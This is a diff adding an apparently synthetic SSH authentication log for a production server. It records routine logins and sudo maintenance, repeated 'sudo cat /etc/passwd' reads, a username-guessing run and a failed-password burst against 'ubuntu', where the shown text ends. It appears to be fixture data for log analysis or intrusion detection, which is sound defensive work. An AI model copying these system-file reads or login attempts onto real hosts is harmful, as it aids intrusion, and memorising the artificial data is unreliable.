@@ -1,0 +1,894 @@
+May 19 08:01:05 prod-server-01 sshd[8285]: Accepted password for ubuntu from 192.168.1.10 port 63835 ssh2
+May 19 08:01:07 prod-server-01 sshd[2876]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 08:01:37 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 08:08:53 prod-server-01 sshd[1917]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 08:09:13 prod-server-01 sshd[5550]: Accepted password for deploy from 192.168.1.20 port 62755 ssh2
+May 19 08:09:15 prod-server-01 sshd[3277]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 08:10:37 prod-server-01 sshd[8243]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 08:12:16 prod-server-01 sshd[1399]: Accepted password for monitor from 10.0.0.2 port 52733 ssh2
+May 19 08:12:18 prod-server-01 sshd[3626]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 08:12:48 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 08:18:22 prod-server-01 sshd[9712]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 08:18:41 prod-server-01 sshd[9503]: Accepted password for appuser from 192.168.1.10 port 50821 ssh2
+May 19 08:18:43 prod-server-01 sshd[7870]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 08:19:13 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 08:20:52 prod-server-01 sshd[2155]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 08:21:04 prod-server-01 sshd[1489]: Accepted password for deploy from 192.168.1.10 port 64227 ssh2
+May 19 08:21:06 prod-server-01 sshd[4299]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 08:21:36 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 08:23:30 prod-server-01 sshd[2477]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 08:24:20 prod-server-01 sshd[8818]: Accepted password for appuser from 192.168.1.20 port 52112 ssh2
+May 19 08:24:22 prod-server-01 sshd[4076]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 08:25:56 prod-server-01 sshd[5685]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 08:27:26 prod-server-01 sshd[2941]: Accepted password for monitor from 10.0.0.5 port 58624 ssh2
+May 19 08:27:28 prod-server-01 sshd[8390]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 08:27:58 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 19 08:30:22 prod-server-01 sshd[5689]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 08:32:22 prod-server-01 sshd[9367]: Accepted password for appuser from 10.0.0.5 port 57383 ssh2
+May 19 08:32:24 prod-server-01 sshd[9699]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 08:41:35 prod-server-01 sshd[6388]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 08:42:43 prod-server-01 sshd[1881]: Accepted password for appuser from 192.168.1.10 port 56580 ssh2
+May 19 08:42:45 prod-server-01 sshd[6446]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 08:49:38 prod-server-01 sshd[8056]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 08:50:44 prod-server-01 sshd[2809]: Accepted password for backup from 192.168.1.20 port 57694 ssh2
+May 19 08:50:46 prod-server-01 sshd[8002]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 08:53:41 prod-server-01 sshd[4592]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 08:54:40 prod-server-01 sshd[6565]: Accepted password for appuser from 10.0.0.2 port 60042 ssh2
+May 19 08:54:42 prod-server-01 sshd[8965]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 08:57:28 prod-server-01 sshd[8446]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 08:58:12 prod-server-01 sshd[7695]: Accepted password for backup from 192.168.1.10 port 56441 ssh2
+May 19 08:58:14 prod-server-01 sshd[2266]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 08:59:20 prod-server-01 sshd[5159]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 08:59:35 prod-server-01 sshd[2167]: Accepted password for monitor from 192.168.1.20 port 58495 ssh2
+May 19 08:59:37 prod-server-01 sshd[6783]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 09:00:01 prod-server-01 CRON[2444]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 19 09:00:03 prod-server-01 CRON[2787]: pam_unix(cron:session): session closed for user root by (uid=0)
+May 19 09:00:07 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 09:02:07 prod-server-01 sshd[7611]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 09:03:20 prod-server-01 sshd[1172]: Accepted password for ubuntu from 192.168.1.10 port 64482 ssh2
+May 19 09:03:22 prod-server-01 sshd[8212]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 09:10:37 prod-server-01 sshd[4033]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 09:11:14 prod-server-01 sshd[6050]: Accepted password for appuser from 192.168.1.10 port 60306 ssh2
+May 19 09:11:16 prod-server-01 sshd[6099]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 09:11:46 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 09:13:34 prod-server-01 sshd[9246]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 09:14:59 prod-server-01 sshd[4088]: Accepted password for deploy from 192.168.1.10 port 65409 ssh2
+May 19 09:15:01 prod-server-01 sshd[8328]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 09:24:39 prod-server-01 sshd[9323]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 09:24:51 prod-server-01 sshd[4408]: Accepted password for monitor from 192.168.1.20 port 49174 ssh2
+May 19 09:24:53 prod-server-01 sshd[6681]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 09:33:34 prod-server-01 sshd[5288]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 09:34:43 prod-server-01 sshd[6871]: Accepted password for deploy from 192.168.1.20 port 49259 ssh2
+May 19 09:34:45 prod-server-01 sshd[7006]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 09:35:15 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 09:44:21 prod-server-01 sshd[6161]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 09:44:48 prod-server-01 sshd[6611]: Accepted password for backup from 10.0.0.2 port 55024 ssh2
+May 19 09:44:50 prod-server-01 sshd[1871]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 09:45:57 prod-server-01 sshd[3970]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 09:47:03 prod-server-01 sshd[2250]: Accepted password for appuser from 192.168.1.20 port 60081 ssh2
+May 19 09:47:05 prod-server-01 sshd[8609]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 09:47:35 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 19 09:51:01 prod-server-01 sshd[9155]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 09:51:51 prod-server-01 sshd[6060]: Accepted password for appuser from 10.0.0.5 port 61040 ssh2
+May 19 09:51:53 prod-server-01 sshd[6927]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 09:54:53 prod-server-01 sshd[8203]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 09:55:22 prod-server-01 sshd[3428]: Accepted password for backup from 10.0.0.5 port 56429 ssh2
+May 19 09:55:24 prod-server-01 sshd[5939]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 09:55:54 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 09:58:53 prod-server-01 sshd[4133]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 09:59:56 prod-server-01 sshd[7126]: Accepted password for monitor from 192.168.1.20 port 51803 ssh2
+May 19 09:59:58 prod-server-01 sshd[4664]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 10:00:01 prod-server-01 CRON[5925]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 19 10:00:03 prod-server-01 CRON[1174]: pam_unix(cron:session): session closed for user root by (uid=0)
+May 19 10:08:04 prod-server-01 sshd[2454]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 10:09:21 prod-server-01 sshd[1836]: Accepted password for ubuntu from 192.168.1.20 port 63107 ssh2
+May 19 10:09:23 prod-server-01 sshd[4055]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 10:15:07 prod-server-01 sshd[5220]: Invalid user admin from 198.51.100.77 port 59631
+May 19 10:15:08 prod-server-01 sshd[7688]: Disconnected from 198.51.100.77 port 59631 [preauth]
+May 19 10:15:15 prod-server-01 sshd[4357]: Invalid user root from 198.51.100.77 port 58182
+May 19 10:15:16 prod-server-01 sshd[5315]: Disconnected from 198.51.100.77 port 58182 [preauth]
+May 19 10:15:17 prod-server-01 sshd[3326]: Invalid user test from 198.51.100.77 port 54404
+May 19 10:15:18 prod-server-01 sshd[4894]: Disconnected from 198.51.100.77 port 54404 [preauth]
+May 19 10:15:22 prod-server-01 sshd[1730]: Invalid user guest from 198.51.100.77 port 54604
+May 19 10:15:23 prod-server-01 sshd[1395]: Disconnected from 198.51.100.77 port 54604 [preauth]
+May 19 10:15:24 prod-server-01 sshd[9103]: Invalid user oracle from 198.51.100.77 port 57026
+May 19 10:15:25 prod-server-01 sshd[3456]: Disconnected from 198.51.100.77 port 57026 [preauth]
+May 19 10:15:27 prod-server-01 sshd[3687]: Invalid user pi from 198.51.100.77 port 61280
+May 19 10:15:28 prod-server-01 sshd[3115]: Disconnected from 198.51.100.77 port 61280 [preauth]
+May 19 10:15:34 prod-server-01 sshd[6098]: Invalid user ftpuser from 198.51.100.77 port 59422
+May 19 10:15:35 prod-server-01 sshd[9465]: Disconnected from 198.51.100.77 port 59422 [preauth]
+May 19 10:15:41 prod-server-01 sshd[7594]: Invalid user admin from 198.51.100.77 port 61453
+May 19 10:15:42 prod-server-01 sshd[7360]: Disconnected from 198.51.100.77 port 61453 [preauth]
+May 19 10:15:49 prod-server-01 sshd[8370]: Invalid user root from 198.51.100.77 port 62184
+May 19 10:15:50 prod-server-01 sshd[9647]: Disconnected from 198.51.100.77 port 62184 [preauth]
+May 19 10:15:58 prod-server-01 sshd[8869]: Invalid user test from 198.51.100.77 port 56016
+May 19 10:15:59 prod-server-01 sshd[3257]: Disconnected from 198.51.100.77 port 56016 [preauth]
+May 19 10:16:04 prod-server-01 sshd[6913]: Invalid user guest from 198.51.100.77 port 62911
+May 19 10:16:05 prod-server-01 sshd[2457]: Disconnected from 198.51.100.77 port 62911 [preauth]
+May 19 10:16:13 prod-server-01 sshd[5505]: Invalid user oracle from 198.51.100.77 port 51577
+May 19 10:16:14 prod-server-01 sshd[5203]: Disconnected from 198.51.100.77 port 51577 [preauth]
+May 19 10:16:16 prod-server-01 sshd[1240]: Invalid user pi from 198.51.100.77 port 49235
+May 19 10:16:17 prod-server-01 sshd[3581]: Disconnected from 198.51.100.77 port 49235 [preauth]
+May 19 10:16:18 prod-server-01 sshd[9495]: Invalid user ftpuser from 198.51.100.77 port 61686
+May 19 10:16:19 prod-server-01 sshd[5915]: Disconnected from 198.51.100.77 port 61686 [preauth]
+May 19 10:18:43 prod-server-01 sshd[5805]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 10:19:51 prod-server-01 sshd[6422]: Accepted password for monitor from 192.168.1.10 port 63567 ssh2
+May 19 10:19:53 prod-server-01 sshd[6324]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 10:20:23 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 10:27:40 prod-server-01 sshd[5672]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 10:27:55 prod-server-01 sshd[4170]: Accepted password for appuser from 192.168.1.10 port 52447 ssh2
+May 19 10:27:57 prod-server-01 sshd[6209]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 10:28:27 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 10:34:39 prod-server-01 sshd[7888]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 10:35:20 prod-server-01 sshd[3077]: Accepted password for ubuntu from 10.0.0.5 port 53334 ssh2
+May 19 10:35:22 prod-server-01 sshd[6084]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 10:35:52 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 10:39:10 prod-server-01 sshd[5268]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 10:39:36 prod-server-01 sshd[6590]: Accepted password for backup from 10.0.0.2 port 61465 ssh2
+May 19 10:39:38 prod-server-01 sshd[3338]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 10:44:36 prod-server-01 sshd[3627]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 10:45:44 prod-server-01 sshd[7899]: Accepted password for appuser from 10.0.0.2 port 50667 ssh2
+May 19 10:45:46 prod-server-01 sshd[9213]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 10:49:42 prod-server-01 sshd[3699]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 10:51:00 prod-server-01 sshd[2266]: Accepted password for ubuntu from 192.168.1.10 port 53666 ssh2
+May 19 10:51:02 prod-server-01 sshd[7684]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 11:00:01 prod-server-01 CRON[7241]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 19 11:00:03 prod-server-01 CRON[5864]: pam_unix(cron:session): session closed for user root by (uid=0)
+May 19 11:00:57 prod-server-01 sshd[4844]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 11:02:13 prod-server-01 sshd[5684]: Accepted password for appuser from 192.168.1.10 port 57267 ssh2
+May 19 11:02:15 prod-server-01 sshd[2238]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 11:02:45 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 11:07:23 prod-server-01 sshd[7077]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 11:09:08 prod-server-01 sshd[6058]: Accepted password for monitor from 10.0.0.2 port 61037 ssh2
+May 19 11:09:10 prod-server-01 sshd[1194]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 11:09:40 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 11:19:31 prod-server-01 sshd[1181]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 11:19:44 prod-server-01 sshd[7966]: Accepted password for monitor from 192.168.1.20 port 63637 ssh2
+May 19 11:19:46 prod-server-01 sshd[1226]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 11:22:56 prod-server-01 sshd[9494]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 11:24:00 prod-server-01 sshd[2287]: Accepted password for ubuntu from 10.0.0.5 port 63042 ssh2
+May 19 11:24:02 prod-server-01 sshd[9443]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 11:24:32 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 11:27:05 prod-server-01 sshd[6654]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 11:27:40 prod-server-01 sshd[2134]: Accepted password for monitor from 10.0.0.5 port 52089 ssh2
+May 19 11:27:42 prod-server-01 sshd[5871]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 11:36:09 prod-server-01 sshd[1672]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 11:37:57 prod-server-01 sshd[3493]: Accepted password for backup from 10.0.0.2 port 54617 ssh2
+May 19 11:37:59 prod-server-01 sshd[5556]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 11:44:11 prod-server-01 sshd[8047]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 11:45:41 prod-server-01 sshd[4024]: Accepted password for backup from 192.168.1.10 port 54470 ssh2
+May 19 11:45:43 prod-server-01 sshd[1739]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 11:47:58 prod-server-01 sshd[7335]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 11:49:41 prod-server-01 sshd[9909]: Accepted password for appuser from 10.0.0.2 port 65525 ssh2
+May 19 11:49:43 prod-server-01 sshd[7058]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 11:50:13 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 11:54:05 prod-server-01 sshd[4671]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 11:55:28 prod-server-01 sshd[2380]: Accepted password for ubuntu from 10.0.0.5 port 51683 ssh2
+May 19 11:55:30 prod-server-01 sshd[7526]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 12:00:01 prod-server-01 CRON[4435]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 19 12:00:03 prod-server-01 CRON[2899]: pam_unix(cron:session): session closed for user root by (uid=0)
+May 19 12:03:15 prod-server-01 sshd[2296]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 12:04:35 prod-server-01 sshd[3256]: Accepted password for backup from 192.168.1.10 port 55156 ssh2
+May 19 12:04:37 prod-server-01 sshd[6073]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 12:08:07 prod-server-01 sshd[3164]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 12:09:47 prod-server-01 sshd[2197]: Accepted password for appuser from 192.168.1.10 port 63853 ssh2
+May 19 12:09:49 prod-server-01 sshd[6931]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 12:11:33 prod-server-01 sshd[7624]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 12:13:27 prod-server-01 sshd[9001]: Accepted password for appuser from 192.168.1.10 port 55080 ssh2
+May 19 12:13:29 prod-server-01 sshd[7963]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 12:13:59 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 12:23:09 prod-server-01 sshd[4318]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 12:23:35 prod-server-01 sshd[6682]: Accepted password for appuser from 10.0.0.5 port 59555 ssh2
+May 19 12:23:37 prod-server-01 sshd[9591]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 12:24:07 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 12:32:55 prod-server-01 sshd[6424]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 12:34:34 prod-server-01 sshd[6954]: Accepted password for ubuntu from 192.168.1.20 port 64997 ssh2
+May 19 12:34:36 prod-server-01 sshd[1857]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 12:44:05 prod-server-01 sshd[5305]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 12:44:53 prod-server-01 sshd[2615]: Accepted password for ubuntu from 10.0.0.2 port 63888 ssh2
+May 19 12:44:55 prod-server-01 sshd[6624]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 12:45:25 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 12:52:22 prod-server-01 sshd[7254]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 12:52:36 prod-server-01 sshd[3056]: Accepted password for monitor from 192.168.1.10 port 49517 ssh2
+May 19 12:52:38 prod-server-01 sshd[2430]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 12:57:46 prod-server-01 sshd[9621]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 12:59:17 prod-server-01 sshd[7757]: Accepted password for monitor from 192.168.1.20 port 62198 ssh2
+May 19 12:59:19 prod-server-01 sshd[8373]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 13:00:01 prod-server-01 CRON[9861]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 19 13:00:03 prod-server-01 CRON[1988]: pam_unix(cron:session): session closed for user root by (uid=0)
+May 19 13:01:20 prod-server-01 sshd[6298]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 13:03:03 prod-server-01 sshd[7322]: Accepted password for appuser from 10.0.0.2 port 62913 ssh2
+May 19 13:03:05 prod-server-01 sshd[9137]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 13:10:25 prod-server-01 sshd[2673]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 13:10:40 prod-server-01 sshd[7329]: Accepted password for backup from 10.0.0.5 port 58241 ssh2
+May 19 13:10:42 prod-server-01 sshd[4974]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 13:11:12 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 19 13:13:56 prod-server-01 sshd[6630]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 13:14:34 prod-server-01 sshd[1699]: Accepted password for ubuntu from 10.0.0.5 port 51493 ssh2
+May 19 13:14:36 prod-server-01 sshd[4335]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 13:15:06 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 13:18:44 prod-server-01 sshd[1962]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 13:19:10 prod-server-01 sshd[9369]: Accepted password for monitor from 192.168.1.10 port 51927 ssh2
+May 19 13:19:12 prod-server-01 sshd[8985]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 13:19:42 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 13:21:29 prod-server-01 sshd[8647]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 13:22:34 prod-server-01 sshd[9252]: Accepted password for monitor from 192.168.1.20 port 53756 ssh2
+May 19 13:22:36 prod-server-01 sshd[2804]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 13:23:06 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 13:28:35 prod-server-01 sshd[5482]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 13:30:29 prod-server-01 sshd[7908]: Accepted password for deploy from 192.168.1.10 port 62873 ssh2
+May 19 13:30:31 prod-server-01 sshd[6380]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 13:31:01 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 13:35:18 prod-server-01 sshd[6061]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 13:36:16 prod-server-01 sshd[8553]: Accepted password for monitor from 10.0.0.2 port 63501 ssh2
+May 19 13:36:18 prod-server-01 sshd[2278]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 13:41:39 prod-server-01 sshd[9092]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 13:43:39 prod-server-01 sshd[1908]: Accepted password for ubuntu from 192.168.1.20 port 52937 ssh2
+May 19 13:43:41 prod-server-01 sshd[1031]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 13:44:11 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 13:52:24 prod-server-01 sshd[2736]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 13:53:30 prod-server-01 sshd[9997]: Accepted password for deploy from 10.0.0.5 port 63214 ssh2
+May 19 13:53:32 prod-server-01 sshd[1209]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 14:00:01 prod-server-01 CRON[4250]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 19 14:00:03 prod-server-01 CRON[3546]: pam_unix(cron:session): session closed for user root by (uid=0)
+May 19 14:03:08 prod-server-01 sshd[8357]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 14:03:44 prod-server-01 sshd[1676]: Accepted password for ubuntu from 10.0.0.5 port 52557 ssh2
+May 19 14:03:46 prod-server-01 sshd[1438]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 14:10:29 prod-server-01 sshd[7378]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 14:12:14 prod-server-01 sshd[1634]: Accepted password for monitor from 192.168.1.10 port 61754 ssh2
+May 19 14:12:16 prod-server-01 sshd[4541]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 14:20:26 prod-server-01 sshd[2160]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 14:21:14 prod-server-01 sshd[8627]: Accepted password for ubuntu from 192.168.1.10 port 50793 ssh2
+May 19 14:21:16 prod-server-01 sshd[9666]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 14:26:16 prod-server-01 sshd[2487]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 14:26:37 prod-server-01 sshd[6896]: Accepted password for ubuntu from 10.0.0.5 port 58806 ssh2
+May 19 14:26:39 prod-server-01 sshd[6976]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 14:30:03 prod-server-01 sshd[5137]: Failed password for ubuntu from 203.0.113.42 port 61468 ssh2
+May 19 14:30:05 prod-server-01 sshd[4588]: Failed password for ubuntu from 203.0.113.42 port 60161 ssh2
+May 19 14:30:07 prod-server-01 sshd[6728]: Failed password for ubuntu from 203.0.113.42 port 57300 ssh2
+May 19 14:30:11 prod-server-01 sshd[5619]: Failed password for ubuntu from 203.0.113.42 port 57318 ssh2
+May 19 14:30:15 prod-server-01 sshd[4444]: Failed password for ubuntu from 203.0.113.42 port 53135 ssh2
+May 19 14:30:18 prod-server-01 sshd[5247]: Failed password for ubuntu from 203.0.113.42 port 58572 ssh2
+May 19 14:30:21 prod-server-01 sshd[9818]: Failed password for ubuntu from 203.0.113.42 port 57651 ssh2
+May 19 14:30:23 prod-server-01 sshd[5227]: Failed password for ubuntu from 203.0.113.42 port 51867 ssh2
+May 19 14:30:26 prod-server-01 sshd[6100]: Failed password for ubuntu from 203.0.113.42 port 63384 ssh2
+May 19 14:30:30 prod-server-01 sshd[9042]: Failed password for ubuntu from 203.0.113.42 port 56957 ssh2
+May 19 14:30:33 prod-server-01 sshd[9474]: Failed password for ubuntu from 203.0.113.42 port 51597 ssh2
+May 19 14:30:37 prod-server-01 sshd[8279]: Failed password for ubuntu from 203.0.113.42 port 56374 ssh2
+May 19 14:30:38 prod-server-01 sshd[7396]: Failed password for ubuntu from 203.0.113.42 port 60542 ssh2
+May 19 14:30:40 prod-server-01 sshd[1121]: Failed password for ubuntu from 203.0.113.42 port 62062 ssh2
+May 19 14:30:41 prod-server-01 sshd[5354]: Failed password for ubuntu from 203.0.113.42 port 51327 ssh2
+May 19 14:30:44 prod-server-01 sshd[2971]: Failed password for ubuntu from 203.0.113.42 port 59384 ssh2
+May 19 14:30:47 prod-server-01 sshd[4747]: Failed password for ubuntu from 203.0.113.42 port 50029 ssh2
+May 19 14:30:51 prod-server-01 sshd[2716]: Failed password for ubuntu from 203.0.113.42 port 53975 ssh2
+May 19 14:30:52 prod-server-01 sshd[9813]: Failed password for ubuntu from 203.0.113.42 port 62136 ssh2
+May 19 14:30:54 prod-server-01 sshd[6446]: Failed password for ubuntu from 203.0.113.42 port 61287 ssh2
+May 19 14:30:58 prod-server-01 sshd[4527]: Failed password for ubuntu from 203.0.113.42 port 49926 ssh2
